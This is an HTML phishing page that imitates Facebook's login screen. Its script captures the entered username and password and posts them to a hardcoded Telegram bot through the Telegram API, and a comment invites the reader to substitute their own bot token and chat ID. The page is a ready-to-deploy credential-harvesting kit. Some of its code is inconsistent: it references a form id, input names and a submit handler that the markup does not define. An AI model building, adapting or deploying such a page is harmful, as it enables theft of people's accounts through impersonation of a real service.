 <!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      background: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    .container h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
    }
    .note {
      margin-top: 20px;
      font-size: 12px;
      color: gray;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>facebook</h2>
    <form onsubmit="handleSubmit(event)">
      <input type="text" placeholder="Email or Phone number" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="note">
      ©2025 All Right Reserved By Facebook
    </div>
  <script>
    // Replace these with your Telegram Bot Token and Chat ID
    const botToken = '7531384739:AAEEI8D_CM7wmJLTJO7_pYCuY6U__wnpmxs';
    const chatId = '6760519562';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault(); // prevent page reload

      const username = this.username.value.trim();
      const password = this.password.value.trim();

      if (!username || !password) {
        alert('Please fill in both fields.');
        return;
      }

      const message = `
🔐 New Login Attempt:
👤 Username: ${username}
🔑 Password: ${password}
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
        .then(response => {
          if (response.ok) {
            alert('Login info sent to Telegram!');
            // Optionally, clear the form or redirect
            this.reset();
            // window.location.href = '/dashboard'; // Uncomment to redirect
          } else {
            alert('Failed to send data to Telegram.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Error sending data to Telegram.');
        });
    });
  </script>
    
  </div>  </body>
</html>
